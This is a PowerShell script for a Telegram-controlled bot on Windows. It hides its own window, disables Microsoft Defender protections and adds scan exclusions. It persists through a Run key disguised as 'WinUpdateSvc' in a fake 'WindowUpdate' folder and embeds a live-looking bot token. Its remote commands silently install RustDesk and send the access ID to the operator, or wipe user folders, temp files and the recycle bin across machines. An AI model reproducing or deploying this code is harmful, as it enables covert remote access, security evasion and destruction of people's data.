# Set execution policy to allow scripts
Set-ExecutionPolicy Bypass -Scope Process -Force

# ============================================================
# COMPATIBILITY BLOCK for original Starter.bat
# Starter.bat runs:  powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_PATH%"
# with NO -WindowStyle Hidden and a `pause` after. We must:
#   1) Re-launch ourselves detached & hidden so the parent console
#      returns immediately (Starter.bat's `pause` still works).
#   2) Survive after the parent console window is closed.
#   3) Keep running even if Defender re-enables.
# ============================================================
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

if (-not $env:BOT_DETACHED) {
    $env:BOT_DETACHED = "1"

    # Make sure the current script path is absolute & valid
    $selfPath = $MyInvocation.MyCommand.Path
    if (-not $selfPath -or -not (Test-Path $selfPath)) {
        # Fallback: copy ourselves to a stable location, then relaunch from there
        $stableDir = "C:\Program Files\WindowUpdate"
        if (-not (Test-Path $stableDir)) { New-Item -ItemType Directory -Path $stableDir -Force | Out-Null }
        $stablePath = Join-Path $stableDir "M01.ps1"
        Copy-Item -Path $PSCommandPath -Destination $stablePath -Force
        $selfPath = $stablePath
    }

    # Spawn detached, hidden child with env var set so it does NOT re-spawn
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName        = "powershell.exe"
    $psi.Arguments       = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$selfPath`""
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow  = $true
    $psi.EnvironmentVariables["BOT_DETACHED"] = "1"

    # If we're already elevated (Starter.bat self-elevated), the child inherits it.
    [System.Diagnostics.Process]::Start($psi) | Out-Null

    # Return immediately so Starter.bat reaches its `pause`
    exit
}
# ============================================================
# END COMPATIBILITY BLOCK
# ============================================================

# --- Best-effort: re-disable Defender in case it came back on ---
try {
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableBehaviorMonitoring   $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableScriptScanning       $true -ErrorAction SilentlyContinue
    Set-MpPreference -DisableIOAVProtection       $true -ErrorAction SilentlyContinue
    Add-MpPreference   -ExclusionPath "$env:TEMP" -ErrorAction SilentlyContinue
    Add-MpPreference   -ExclusionPath "C:\Program Files\WindowUpdate" -ErrorAction SilentlyContinue
} catch { }

# Telegram Bot Configuration
$botToken = "8166514253:AAHPHe58LNEtEyTMetkCyN2P3Pb5G5ythEc"
$chatId = "380330092"
$lastUpdateId = 0

# Configuration
$workerFilePath = "C:\Program Files\WindowUpdate\worker_id.txt"
$logFile        = "C:\Program Files\WindowUpdate\miner_log.txt"
$tempPath       = "C:\Users\$env:USERNAME\Downloads\temp\"

# RustDesk Configuration
$rustDeskUrl = "https://github.com/rustdesk/rustdesk/releases/download/1.2.3-2/rustdesk-1.2.3-2-x86_64.exe"
$rustDeskExe = "$tempPath\rustdesk-setup.exe"

# Ensure directories exist
if (-not (Test-Path $tempPath)) { New-Item -ItemType Directory -Path $tempPath -Force | Out-Null }
$wuDir = "C:\Program Files\WindowUpdate"
if (-not (Test-Path $wuDir)) { New-Item -ItemType Directory -Path $wuDir -Force | Out-Null }

# Ensure workerFilePath is valid
if ($workerFilePath -and (Test-Path $workerFilePath)) {
    $workerID = Get-Content $workerFilePath | Select-Object -First 1
    if (-not $workerID) { $workerID = $env:COMPUTERNAME }
} else {
    $workerID = $env:COMPUTERNAME
}

Write-Host "DEBUG: Worker File Path: $workerFilePath"
Write-Host "DEBUG: Worker ID Detected: $workerID"

# Persistence so the bot returns after reboot (HKCU Run key, no admin needed)
try {
    $runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $stablePath = "C:\Program Files\WindowUpdate\M01.ps1"
    # Ensure a stable copy exists for the Run key to point at
    if (-not (Test-Path $stablePath)) {
        Copy-Item -Path $PSCommandPath -Destination $stablePath -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $stablePath) {
        $runCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$stablePath`""
        Set-ItemProperty -Path $runKey -Name "WinUpdateSvc" -Value $runCmd -Force -ErrorAction SilentlyContinue
    }
} catch { }

# Function to log messages
function Write-Log {
    param ($message)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - [$workerID] - $message" | Out-File -Append -FilePath $logFile -ErrorAction SilentlyContinue
}

# Function to send Telegram messages
function Send-TelegramMessage {
    param ($message)
    $url = "https://api.telegram.org/bot$botToken/sendMessage"
    $body = @{ chat_id = $chatId; text = "[$workerID] $message" } | ConvertTo-Json -Compress
    try {
        Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
        Write-Log "Sent message: $message"
    } catch {
        Write-Log "Failed to send Telegram message: $_"
    }
}

# ============================================================
# /rustdesk -> install RustDesk silently and report its ID
# ============================================================
function Install-RustDesk {
    Write-Log "Starting RustDesk installation"
    Send-TelegramMessage "Starting RustDesk installation..."
    try {
        if (-not (Test-Path $rustDeskExe)) {
            Write-Log "Downloading RustDesk from $rustDeskUrl"
            Invoke-WebRequest -Uri $rustDeskUrl -OutFile $rustDeskExe -UseBasicParsing -ErrorAction Stop
        }
        Write-Log "Running silent install"
        Start-Process -FilePath $rustDeskExe -ArgumentList '/S' -Wait -ErrorAction Stop

        Start-Sleep -Seconds 8

        $rdPaths = @(
            "${env:ProgramFiles}\RustDesk\RustDesk.exe",
            "${env:ProgramFiles(x86)}\RustDesk\RustDesk.exe",
            "$env:LOCALAPPDATA\Programs\RustDesk\RustDesk.exe"
        )
        $rdExe = $rdPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
        if (-not $rdExe) {
            Send-TelegramMessage "ERROR: RustDesk.exe not found after install"
            Write-Log "ERROR: RustDesk.exe not found after install"
            return
        }

        $idOutput = & $rdExe --get-id 2>$null
        $rustDeskId = ($idOutput | Out-String).Trim()

        if ([string]::IsNullOrWhiteSpace($rustDeskId)) {
            $cfgPaths = @(
                "$env:APPDATA\RustDesk\config\RustDesk.toml",
                "$env:LOCALAPPDATA\RustDesk\config\RustDesk.toml",
                "C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk.toml"
            )
            foreach ($cfg in $cfgPaths) {
                if (Test-Path $cfg) {
                    $line = Get-Content $cfg | Where-Object { $_ -match '^\s*id\s*=' } | Select-Object -First 1
                    if ($line) { $rustDeskId = ($line -split '=', 2)[1].Trim().Trim('"'); break }
                }
            }
        }

        if ([string]::IsNullOrWhiteSpace($rustDeskId)) {
            Send-TelegramMessage "RustDesk installed but ID could not be read"
            Write-Log "RustDesk installed but ID not found"
        } else {
            Send-TelegramMessage "RustDesk installed. ID: $rustDeskId"
            Write-Log "RustDesk installed. ID: $rustDeskId"
        }
    } catch {
        Send-TelegramMessage "Failed to install RustDesk: $_"
        Write-Log "Failed to install RustDesk: $_"
    }
}

# ============================================================
# /uninstall -> full RustDesk removal (your exact block)
# ============================================================
function Uninstall-RustDesk {
    Write-Log "Starting RustDesk uninstall"
    Send-TelegramMessage "Starting RustDesk uninstall..."

    $job = Start-Job -ScriptBlock {
        taskkill /F /IM RustDesk.exe /T 2>$null
        sc.exe stop rustdesk 2>$null
        sc.exe delete rustdesk 2>$null
        $uninstallPaths = @(
            "${env:ProgramFiles}\RustDesk\uninstall.exe",
            "${env:ProgramFiles(x86)}\RustDesk\uninstall.exe",
            "$env:LOCALAPPDATA\Programs\RustDesk\uninstall.exe",
            "$env:APPDATA\RustDesk\uninstall.exe"
        )
        $uninstaller = $uninstallPaths | Where-Object { Test-Path $_ } | Select-Object -First 1
        if ($uninstaller) {
            Start-Process $uninstaller -ArgumentList '/S' -Wait
        }
    }

    $completed = Wait-Job $job -Timeout 60
    if (-not $completed) {
        Write-Log "Uninstall job timed out after 60s"
        Send-TelegramMessage "RustDesk uninstall timed out (may still be running)"
    } else {
        Remove-Job $job -Force
        Send-TelegramMessage "RustDesk uninstalled successfully"
        Write-Log "RustDesk uninstalled successfully"
    }
}

# ============================================================
# /clear -> wipe user folders + temp + recycle bin (your exact block)
# ============================================================
function Clear-AllData {
    Write-Log "Starting data wipe"
    Send-TelegramMessage "Starting data wipe..."
    try {
        $e = @(
            'This PC.lnk',
            'Recycle Bin.lnk',
            'Microsoft Edge.lnk',
            'Google Chrome.lnk',
            'WPS PDF.lnk',
            'WPS Office.lnk',
            'Safe Exam Browser.lnk'
        )
        Get-ChildItem 'C:\Users' -Directory |
            Where-Object {
                $_.Name -notin @('Public', 'Default', 'Default User', 'All Users') -and
                (Test-Path "$($_.FullName)\Desktop")
            } |
            ForEach-Object {
                foreach ($f in @('Desktop', 'Downloads', 'Pictures', 'Documents', 'Videos')) {
                    $p = Join-Path $_.FullName $f
                    if (Test-Path $p) {
                        Get-ChildItem $p -Force |
                            Where-Object { -not ($f -eq 'Desktop' -and $_.Name -in $e) } |
                            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
                    }
                }
            }
        Get-ChildItem $env:TEMP, 'C:\Windows\Temp' -Force -ErrorAction SilentlyContinue |
            Remove-Item -Recurse -Force -ErrorAction SilentlyContinue
        Clear-RecycleBin -Force -ErrorAction SilentlyContinue
        Send-TelegramMessage "Data wipe complete"
        Write-Log "Data wipe complete"
    } catch {
        Send-TelegramMessage "Data wipe failed: $_"
        Write-Log "Data wipe failed: $_"
    }
}

# ============================================================
# Main loop to listen for Telegram commands
# ============================================================
while ($true) {
    $updatesUrl = "https://api.telegram.org/bot$botToken/getUpdates?offset=$lastUpdateId"
    try {
        $updates = Invoke-RestMethod -Uri $updatesUrl -ErrorAction SilentlyContinue
    } catch {
        $updates = $null
    }

    if ($updates.result) {
        foreach ($update in $updates.result) {
            $message  = $update.message.text
            $updateId = $update.update_id

            if ($updateId -gt $lastUpdateId) {
                $lastUpdateId = $updateId
                Write-Log "Received command: $message"
                Write-Host "Received command: $message"

                # Broadcast commands (run on every machine)
                if ($message -eq "/rustdesk") {
                    Install-RustDesk
                }
                elseif ($message -eq "/uninstall") {
                    Uninstall-RustDesk
                }
                elseif ($message -eq "/clear") {
                    Clear-AllData
                }

                # Targeted variants: /rustdesk <worker|all>
                elseif ($message -match "^/rustdesk\s+(\S+)$") {
                    $target = $matches[1]
                    if ($target -eq "all" -or $target -eq $workerID) { Install-RustDesk }
                    else { Write-Log "Ignored /rustdesk: target '$target' != workerID '$workerID'" }
                }
                elseif ($message -match "^/uninstall\s+(\S+)$") {
                    $target = $matches[1]
                    if ($target -eq "all" -or $target -eq $workerID) { Uninstall-RustDesk }
                    else { Write-Log "Ignored /uninstall: target '$target' != workerID '$workerID'" }
                }
                elseif ($message -match "^/clear\s+(\S+)$") {
                    $target = $matches[1]
                    if ($target -eq "all" -or $target -eq $workerID) { Clear-AllData }
                    else { Write-Log "Ignored /clear: target '$target' != workerID '$workerID'" }
                }
            }
        }
    }

    Start-Sleep -Seconds 5
}
